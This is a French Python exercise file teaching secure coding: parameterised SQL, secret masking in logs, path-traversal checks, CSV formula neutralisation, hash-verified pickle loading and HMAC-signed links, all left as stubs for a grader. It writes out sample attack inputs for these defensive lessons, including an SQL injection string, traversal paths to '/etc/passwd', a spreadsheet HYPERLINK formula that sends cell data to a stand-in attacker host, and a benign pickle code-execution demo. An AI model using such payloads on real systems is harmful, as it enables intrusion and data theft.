"""Série 13 — Écrire du code sûr : injection SQL, secrets, chemins, formules, pickle, liens signés.

🔐 VOUS VOULEZ DÉVELOPPER ? ÉCRIVEZ DU CODE QU'ON NE PEUT PAS DÉTOURNER.

Votre code marche quand on l'utilise normalement. La sécurité, c'est ce qui se passe quand
quelqu'un l'utilise ANORMALEMENT : un nom de client qui contient du SQL, un nom de fichier qui
remonte vers d'autres dossiers, un lien modifié à la main. En revue de code, ce sont les premières
questions qu'on vous posera, et une seule faille suffit à faire la une.

Les six défis viennent de vrais morceaux du projet : la base de clients (série 10), le journal de
l'API, l'export CSV du tableau de bord, le modèle `models/churn_model.joblib` chargé par `api.py`,
et le SMS de relance de la série 12. Chaque fois, la même idée :

    une donnée qui vient de l'extérieur est une DONNÉE, jamais du code ;
    et on ne fait confiance qu'à ce qu'on a VÉRIFIÉ.

Prérequis : la série 00 et le défi 40 (série 06 : les exceptions). Les séries 10 (SQL) et 12 (API)
aident pour comprendre le contexte, mais ne sont pas obligatoires. Rien à installer : tout utilise
la bibliothèque standard de Python (`sqlite3`, `pathlib`, `hashlib`, `hmac`, `pickle`) et pandas.

⚖️  Tout se passe sur votre ordinateur, sur des données inventées : le correcteur joue l'attaquant
contre VOTRE code, pour vérifier qu'il résiste. N'essayez jamais ces entrées sur un site ou un
service qui ne vous appartient pas : c'est interdit par la loi (article 323-1 du Code pénal).

▶️  Essayer en écrivant, dans un terminal Python :

    >>> from defis.serie_13 import *
    >>> clients_par_nom(base_exemple(), "D'Almeida")                    # défi 80
    >>> masquer_secrets({"X-API-Key": "abc", "client_id": "C001"})        # défi 81
    >>> chemin_export(bac_a_sable(), "../secrets.csv")                     # défi 82
    >>> neutraliser_formules(exemple_export())                             # défi 83
    >>> demo_pickle_dangereux()                                            # défi 84 : à voir une fois !

✍️  C'EST VOTRE FICHIER. Même mode d'emploi que les autres séries :

1. Remplacez chaque `raise NotImplementedError` par votre code.
2. Lancez `python scripts/defis.py --defi 80` (le numéro du défi) : ✅ ou ❌ avec l'explication.
3. Bloqué·e ? Relisez l'indice, puis seulement en dernier recours ouvrez `defis/corrige_serie_13.py`.

Niveaux : 🟢 débutant · 🟡 intermédiaire · 🔴 avancé.
"""

from __future__ import annotations

import hashlib  # noqa: F401 — pour les défis 84 et 85
import hmac  # noqa: F401 — pour le défi 85
import pickle
import re  # noqa: F401
import sqlite3
import tempfile
from pathlib import Path

import pandas as pd

MOTS_SENSIBLES = ("password", "mot_de_passe", "secret", "token", "api_key", "authorization")
MASQUE = "***"
DEBUTS_DANGEREUX = ("=", "+", "-", "@", "\t", "\r")

_CLIENTS = [  # insérés dans le désordre : l'ordre de la table n'est pas l'ordre des identifiants
    ("C004", "Martin", "Mensuel", 89.9),
    ("C001", "Martin", "Annuel", 45.0),
    ("C006", "Martin", "Mensuel", 60.0),
    ("C002", "D'Almeida", "Mensuel", 70.5),
    ("C005", "martin", "Biannuel", 99.0),
    ("C003", "Zébulon", "Biannuel", 55.0),
]


def base_exemple() -> sqlite3.Connection:
    """Une base SQLite en mémoire, NEUVE à chaque appel, avec une table `clients` de 6 lignes.

        clients(id TEXT, nom TEXT, contrat TEXT, facture_mensuelle REAL)

    Pour la voir : `base_exemple().execute("SELECT * FROM clients").fetchall()`.
    """
    connexion = sqlite3.connect(":memory:")
    connexion.execute("CREATE TABLE clients (id TEXT PRIMARY KEY, nom TEXT NOT NULL, contrat TEXT NOT NULL, "
                      "facture_mensuelle REAL NOT NULL)")
    connexion.executemany("INSERT INTO clients VALUES (?, ?, ?, ?)", _CLIENTS)
    connexion.commit()
    return connexion


def bac_a_sable() -> Path:
    """Crée un dossier temporaire et renvoie son sous-dossier `exports`, pour essayer le défi 82.

        <temporaire>/exports/              ← le dossier d'export (renvoyé)
        <temporaire>/exports/equipe/       ← un sous-dossier autorisé
        <temporaire>/exports/raccourci  →  <temporaire>/ailleurs   (lien symbolique, si possible)
        <temporaire>/exports_pirate/       ← un dossier voisin au nom trompeur
        <temporaire>/ailleurs/
    """
    racine = Path(tempfile.mkdtemp(prefix="defi82_"))
    exports = racine / "exports"
    (exports / "equipe").mkdir(parents=True)
    (racine / "exports_pirate").mkdir()
    (racine / "ailleurs").mkdir()
    try:
        (exports / "raccourci").symlink_to(racine / "ailleurs", target_is_directory=True)
    except (OSError, NotImplementedError):
        pass  # Windows sans droits de création de liens
    return exports


def exemple_export() -> pd.DataFrame:
    """Un extrait de l'export « clients à risque », dont certains champs ont été saisis dans un formulaire."""
    return pd.DataFrame({
        "nom": ["Martin", '=HYPERLINK("http://pirate.example/?"&A1;"Cliquez ici")', "+33 6 12 34 56 78", "-Dupont"],
        "facture": [89.9, -12.5, 45.0, 0.0],
        "commentaire": ["ok", 42, "=2*3", None],
    }, index=pd.Index(["C001", "C002", "C003", "C004"], name="id"))


class _Demo:
    def __reduce__(self):
        # Au chargement, pickle appellera print(...) : il peut appeler N'IMPORTE QUELLE fonction.
        return (print, ("💥 Ce message vient d'être affiché PENDANT pickle.loads : charger un pickle exécute du code. "
                        "Un attaquant aurait écrit os.system à la place de print.",))


def demo_pickle_dangereux() -> None:
    """Défi 84 : la démonstration, en deux lignes. Lisez `_Demo` juste au-dessus."""
    octets = pickle.dumps(_Demo())          # ce que contiendrait un fichier de modèle piégé
    print(f"Le fichier fait {len(octets)} octets. On le charge comme un modèle…")
    pickle.loads(octets)


def modele_exemple(dossier: Path) -> tuple[Path, str]:
    """Écrit un petit modèle (un pickle) dans `dossier` et renvoie (chemin, empreinte SHA-256)."""
    chemin = Path(dossier) / "churn_model.pkl"
    chemin.write_bytes(pickle.dumps({"modele": "logistique", "seuil": 0.4, "coefficients": [0.82, -1.27, 0.31]}))
    return chemin, hashlib.sha256(chemin.read_bytes()).hexdigest()


# ============================================================================ Injection SQL


def clients_par_nom(connexion: sqlite3.Connection, nom: str, contrat: str | None = None) -> list[str]:
    """Défi 80 🟢 — Chercher un client par son nom, sans injection SQL.

    Le service client tape un nom dans un champ de recherche. Renvoyez la liste des identifiants
    des clients qui ont EXACTEMENT ce nom (majuscules comprises), triés par identifiant. Si
    `contrat` est donné, ne gardez que ce type de contrat ; s'il vaut None, pas de filtre.

        >>> clients_par_nom(base_exemple(), "Martin")
        ['C001', 'C004', 'C006']
        >>> clients_par_nom(base_exemple(), "Martin", contrat="Mensuel")
        ['C004', 'C006']
        >>> clients_par_nom(base_exemple(), "D'Almeida")
        ['C002']
        >>> clients_par_nom(base_exemple(), "' OR '1'='1")       # personne ne s'appelle ainsi
        []

    Le piège : écrire la requête avec une f-string, `f"... WHERE nom = '{nom}'"`. Le nom fait alors
    partie du TEXTE de la requête. Avec « D'Almeida », l'apostrophe ferme la chaîne et la requête
    plante ; avec « ' OR '1'='1 », la condition devient toujours vraie et l'on obtient toute la
    table. C'est l'injection SQL, une des failles les plus exploitées depuis 25 ans.

    Ce que vous apprenez : les requêtes paramétrées. On écrit un `?` à la place de chaque valeur,
    et on donne les valeurs à part : SQLite les traite comme des valeurs, jamais comme du SQL. Le
    correcteur regarde aussi le texte de vos requêtes : la valeur ne doit pas y apparaître.

    Indice : `connexion.execute("SELECT id FROM clients WHERE nom = ? ORDER BY id", (nom,))`. Attention
    à la virgule : `(nom)` n'est pas un tuple. Pour le contrat facultatif, construisez la requête
    morceau par morceau (`sql += " AND contrat = ?"`) et la liste des valeurs en même temps.
    """
    raise NotImplementedError


# ============================================================================ Secrets dans les journaux


def masquer_secrets(donnees: dict) -> dict:
    """Défi 81 🟢 — Écrire une requête dans le journal sans y écrire les secrets.

    L'API note chaque requête dans un journal, pour comprendre les incidents. Mais les journaux
    sont lus par beaucoup de monde, copiés dans des outils externes, gardés des mois : une clé
    d'API qui s'y trouve en clair est une clé volée. Renvoyez une COPIE de `donnees` où :

    - la valeur de chaque clé SENSIBLE est remplacée par MASQUE (« *** »), quelle que soit cette
      valeur (texte, nombre, None, dictionnaire…) ;
    - une clé est sensible si son nom, mis en minuscules et avec les « - » remplacés par des « _ »,
      CONTIENT l'un des MOTS_SENSIBLES : « X-API-Key » → « x_api_key » contient « api_key » ;
    - les dictionnaires imbriqués sont traités de la même façon, ainsi que les dictionnaires
      rangés dans des listes ;
    - tout le reste est recopié tel quel (mêmes valeurs, mêmes types) ;
    - le dictionnaire reçu n'est PAS modifié : il sert encore à traiter la requête.

        >>> masquer_secrets({"headers": {"X-API-Key": "cle-equipe-data"}, "client_id": "C001"})
        {'headers': {'X-API-Key': '***'}, 'client_id': 'C001'}

    Ce que vous apprenez : à penser à ce que vos journaux révèlent, et à parcourir une structure
    imbriquée (un dictionnaire de dictionnaires de listes…) par récursion : une fonction qui
    s'appelle elle-même sur chaque morceau.

    Indice : une petite fonction `est_sensible(cle)` d'abord. Puis un nouveau dictionnaire en
    compréhension : `{cle: ... for cle, valeur in donnees.items()}`. Pour une valeur qui est un
    dictionnaire, appelez `masquer_secrets(valeur)` ; pour une liste, traitez chaque élément.
    """
    raise NotImplementedError


# ============================================================================ Traversée de répertoire


def chemin_export(dossier: Path, nom_fichier: str) -> Path:
    """Défi 82 🟡 — Choisir le nom de son export… sans écrire n'importe où sur le serveur.

    Le tableau de bord laisse l'utilisateur nommer son fichier d'export. Renvoyez le chemin où
    écrire le fichier : `nom_fichier` placé dans `dossier`, sous forme de chemin absolu et RÉSOLU.
    Le fichier doit rester DANS le dossier d'export (les sous-dossiers sont permis) ; sinon, levez
    une ValueError.

        >>> exports = bac_a_sable()
        >>> chemin_export(exports, "equipe/clients.csv")          # → …/exports/equipe/clients.csv
        >>> chemin_export(exports, "rapport..v2.csv")             # → …/exports/rapport..v2.csv
        >>> chemin_export(exports, "../../home/lea/.bashrc")      # ValueError : sort du dossier

    À refuser : les « .. » qui remontent hors du dossier, un chemin absolu (« /etc/passwd »), un
    lien symbolique qui pointe ailleurs, et le dossier lui-même (« », « . »). `dossier` peut être
    relatif (`Path("exports")`).

    Le piège : chercher les noms dangereux (`".." in nom_fichier`). On en oublie toujours (un
    chemin absolu ne contient pas de « .. »), et on refuse des noms honnêtes (« rapport..v2.csv »).
    Deuxième piège : comparer du texte, `str(chemin).startswith(str(dossier))`, alors que
    « /srv/exports_pirate » commence par « /srv/exports ».

    Ce que vous apprenez : on ne vérifie pas l'entrée, on vérifie le RÉSULTAT. On calcule où le
    fichier irait vraiment, et on regarde si c'est autorisé.

    Indice : `racine = Path(dossier).resolve()`, puis `chemin = (racine / nom_fichier).resolve()`
    (`resolve()` applique les « .. » et suit les liens). Ensuite `chemin.is_relative_to(racine)`, qui
    compare des dossiers et non des lettres, et `chemin == racine`.
    """
    raise NotImplementedError


# ============================================================================ Injection de formules


def neutraliser_formules(df: pd.DataFrame) -> pd.DataFrame:
    """Défi 83 🟡 — Un export CSV qu'on peut ouvrir dans Excel sans danger.

    L'onglet « Clients à risque » s'exporte en CSV, et l'équipe marketing l'ouvre dans Excel. Or
    certains champs viennent d'un formulaire en ligne. Un client qui s'inscrit sous le nom
    `=HYPERLINK("http://pirate.example/?"&A1;"Cliquez ici")` crée une FORMULE : Excel l'exécute à
    l'ouverture, et un clic envoie le contenu des cellules au site de l'attaquant. C'est
    « l'injection de formules » (CSV injection).

    Renvoyez une COPIE de `df` où chaque cellule de TEXTE qui commence par l'un des
    DEBUTS_DANGEREUX (= + - @ tabulation, retour chariot) est précédée d'une apostrophe « ' ».
    L'apostrophe dit à Excel « ceci est du texte » et ne s'affiche pas.

    - les nombres restent des nombres, même négatifs, même dans une colonne qui mélange texte
      et nombres : -12.5 n'est pas une formule ;
    - les valeurs manquantes restent manquantes ;
    - seul le DÉBUT compte : « remise=10% » ne change pas ;
    - rien n'est retiré : « -Dupont » devient « '-Dupont », pas « Dupont » ;
    - une cellule qui commence déjà par « ' » ne change pas ;
    - mêmes colonnes, même index, et le tableau reçu n'est pas modifié.

        >>> neutraliser_formules(exemple_export())["nom"].tolist()[2:]
        ["'+33 6 12 34 56 78", "'-Dupont"]

    Ce que vous apprenez : une donnée change de sens selon le programme qui la lit. Pour pandas,
    « =2*3 » est un texte ; pour Excel, c'est un calcul. On neutralise au moment où la donnée part
    vers ce programme.

    Indice : une fonction pour UNE cellule (`isinstance(valeur, str)`, et `valeur.startswith(...)`
    accepte un tuple), puis `resultat[colonne] = resultat[colonne].map(votre_fonction)` sur une copie,
    pour chaque colonne de texte (`resultat[colonne].dtype == object` ou
    `pd.api.types.is_string_dtype(...)`).
    """
    raise NotImplementedError


# ============================================================================ Désérialisation


def charger_modele_verifie(chemin: Path, empreinte_attendue: str):
    """Défi 84 🟡 (Parcours 6.2) — Charger un modèle seulement s'il est intact.

    `api.py` charge `models/churn_model.joblib`. Or joblib utilise pickle, et charger un pickle
    EXÉCUTE du code : celui que le fichier demande (lancez `demo_pickle_dangereux()` pour le voir).
    Quiconque peut remplacer le fichier du modèle peut donc faire exécuter ce qu'il veut à l'API.

    La parade : à l'entraînement, on note l'empreinte SHA-256 du fichier dans un endroit sûr (le
    dépôt Git, le registre des modèles). Au chargement, on recalcule l'empreinte et on compare.

    - fichier intact → renvoyez l'objet chargé (`pickle.loads`) ;
    - empreinte différente → levez une ValueError, SANS avoir chargé le fichier ;
    - `empreinte_attendue` est le texte hexadécimal de l'empreinte ; elle peut être en majuscules
      et finir par un retour à la ligne (elle est lue dans un fichier) ;
    - lisez le fichier UNE seule fois : si vous le relisez pour le charger, un attaquant peut le
      remplacer entre votre vérification et votre chargement. Le correcteur le fait.

        >>> chemin, empreinte = modele_exemple(Path(tempfile.mkdtemp()))
        >>> charger_modele_verifie(chemin, empreinte)["modele"]
        'logistique'
        >>> charger_modele_verifie(chemin, "0" * 64)       # ValueError, et rien n'a été chargé

    Ce que vous apprenez : vérifier AVANT d'utiliser, et vérifier exactement ce qu'on utilise (pas
    une autre lecture du même fichier). Les spécialistes appellent ce second piège « TOCTOU » : time
    of check to time of use.

    Indice : `octets = Path(chemin).read_bytes()`, puis `hashlib.sha256(octets).hexdigest()`, à comparer
    à `empreinte_attendue.strip().lower()`. Si c'est bon : `pickle.loads(octets)`, les MÊMES octets.
    """
    raise NotImplementedError


# ============================================================================ Lien signé


class Signataire:
    """Défi 85 🔴 — Un lien de désinscription qu'on ne peut ni fabriquer ni modifier.

    Chaque SMS de relance (série 12) se termine par un lien « Ne plus recevoir d'offres » :

        https://exemple.fr/stop?jeton=C001.1767225600.5f0c…

    Si le lien contenait seulement `?client=C001`, n'importe qui pourrait désinscrire n'importe quel
    client en changeant le numéro. Le jeton contient donc une SIGNATURE, calculée avec un secret que
    seul le serveur connaît : modifier le jeton casse la signature.

    Complétez la classe :

    - `Signataire(secret)` : `secret` est en octets (`bytes`). Moins de 16 octets → ValueError (une
      clé courte se devine). Deux objets créés avec le même secret (deux serveurs, ou un serveur
      redémarré) acceptent les mêmes jetons ;
    - `signer(client_id, expiration)` renvoie le jeton (texte) pour ce client, valable jusqu'à
      `expiration` (un instant en secondes, comme `time.time()`). Les identifiants contiennent
      lettres, chiffres, « - » et « _ ». Le jeton doit passer tel quel dans une adresse web :
      lettres, chiffres et « . _ - ~ » seulement ;
    - `verifier(jeton, maintenant)` renvoie l'identifiant du client si le jeton est authentique et
      pas expiré (`maintenant < expiration`). Sinon : ValueError. Et c'est le cas pour TOUT texte
      qui n'est pas un jeton que vous avez signé : modifié, d'un autre secret, coupé, vide, avec
      des caractères accentués… jamais d'IndexError ni de TypeError (l'API répondrait 500).

        >>> s = Signataire(b"une cle de 32 octets, au hasard!")
        >>> jeton = s.signer("C001", 1767225600)
        >>> s.verifier(jeton, maintenant=1700000000)
        'C001'
        >>> s.verifier(jeton.replace("C001", "C002"), maintenant=1700000000)   # ValueError

    Le correcteur modifie votre jeton de toutes les façons possibles (chaque caractère, chaque paire
    de voisins) et vérifie qu'aucune version modifiée ne passe. Il vérifie aussi deux réflexes de
    pro, invisibles de l'extérieur :

    - HMAC, et pas `sha256(secret + message)` : cette construction « maison » permet d'allonger
      un message signé sans connaître le secret (attaque par extension de longueur) ;
    - `hmac.compare_digest` pour comparer deux signatures : `==` s'arrête au premier caractère
      différent, et ce temps de réponse aide à deviner la signature caractère par caractère.

    Ce que vous apprenez : authentifier une donnée qui fait un aller-retour chez le client (lien,
    cookie, jeton d'API). Le même outil sert à pseudonymiser des identifiants pour l'analyse (RGPD).

    Indice : le message signé est `f"{client_id}.{expiration}"` (le séparateur compte : sans lui,
    « C001 » + « 1767… » et « C0011 » + « 767… » donneraient le même texte). La signature :
    `hmac.new(self._secret, message.encode(), hashlib.sha256).hexdigest()`, et le jeton :
    `f"{message}.{signature}"`. Pour vérifier : découpez le jeton, RECALCULEZ la signature à partir
    du client et de l'expiration reçus, comparez-la, puis seulement regardez la date. Une expression
    régulière (`re.fullmatch`) refuse d'un coup tout ce qui n'a pas la bonne forme.
    """

    def __init__(self, secret: bytes) -> None:
        raise NotImplementedError

    def signer(self, client_id: str, expiration: int) -> str:
        raise NotImplementedError

    def verifier(self, jeton: str, maintenant: int) -> str:
        raise NotImplementedError
